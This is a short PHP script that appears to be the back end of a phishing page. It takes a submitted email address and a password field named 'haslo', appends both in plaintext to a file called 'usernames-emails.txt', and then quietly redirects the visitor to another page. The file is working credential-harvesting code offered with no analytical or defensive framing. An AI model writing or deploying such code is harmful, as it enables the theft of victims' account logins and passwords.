<?php
file_put_contents("usernames-emails.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['haslo'] .
"\n", FILE_APPEND);
header('Location: /index2.php');
exit();
?>